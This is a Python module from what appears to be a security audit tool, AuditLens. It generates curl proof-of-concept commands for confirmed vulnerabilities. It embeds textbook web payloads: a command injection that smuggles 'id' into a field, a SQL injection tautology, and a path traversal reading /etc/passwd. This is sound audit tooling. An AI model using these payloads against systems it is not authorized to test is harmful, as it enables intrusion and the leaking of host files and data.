"""
Proof-of-Concept (PoC) generation engine for AuditLens.
Synthesizes actionable exploitation commands for verified vulnerabilities.
"""

from auditlens.models import AuditFinding, VulnClass, AuditVerdict


class PoCGenerator:

    @staticmethod
    def generate_reproduction(finding: AuditFinding, target_url: str = "http://localhost:5000/api") -> str:
        if finding.verdict != AuditVerdict.CONFIRMED_VULNERABLE:
            return "N/A (Finding is not confirmed vulnerable)"

        vuln_class = finding.candidate.vuln_class
        poc_payload = finding.proof_of_concept or "test"

        if vuln_class == VulnClass.COMMAND_INJECTION:
            return (
                f"# Command Injection Proof of Concept\n"
                f"curl -X POST '{target_url}' \\\n"
                f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                f"  -d 'target=127.0.0.1; id #'\n\n"
                f"# Expected Impact: Executes 'id' on the underlying host system."
            )

        elif vuln_class == VulnClass.SQL_INJECTION:
            return (
                f"# SQL Injection Proof of Concept\n"
                f"curl -G '{target_url}' \\\n"
                f"  --data-urlencode 'id=1 OR 1=1 --'\n\n"
                f"# Expected Impact: Bypasses authentication or dumps database rows."
            )

        elif vuln_class == VulnClass.PATH_TRAVERSAL:
            return (
                f"# Path Traversal Proof of Concept\n"
                f"curl -G '{target_url}' \\\n"
                f"  --data-urlencode 'file=../../../../etc/passwd'\n\n"
                f"# Expected Impact: Leaks sensitive host files (e.g. /etc/passwd)."
            )

        return f"curl '{target_url}?payload={poc_payload}'"
